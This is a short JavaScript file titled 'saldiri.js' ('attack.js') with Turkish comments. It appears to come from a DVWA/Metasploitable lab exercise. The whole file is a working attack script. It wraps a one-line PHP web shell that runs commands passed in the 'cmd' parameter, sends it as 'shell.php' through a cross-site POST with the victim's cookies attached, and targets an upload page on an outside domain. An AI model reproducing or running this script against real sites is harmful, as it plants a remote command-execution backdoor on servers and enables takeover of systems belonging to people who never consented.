// saldiri.js dosyasının içeriği

// 1. Basit bir PHP Shell içeriği (Metasploitable genelde PHP çalıştırır)
var shellCode = "<?php system($_GET['cmd']); ?>";

// 2. Dosya (Blob) nesnesi oluştur
var blob = new Blob([shellCode], { type: 'text/plain' });

// 3. Form verisi oluştur (Sanki dosya seçilmiş gibi)
var formData = new FormData();
formData.append('uploaded', blob, 'shell.php'); // 'uploaded' DVWA'daki input ismidir
formData.append('Upload', 'Upload'); // Butona basma simülasyonu

// 4. İsteği gönder (POST)
var xhr = new XMLHttpRequest();
xhr.open('POST', 'https://websiteciabi.com/low.php', true);
xhr.withCredentials = true; // Cookie'leri de götür
xhr.send(formData);

console.log("Shell yükleme isteği gönderildi!");
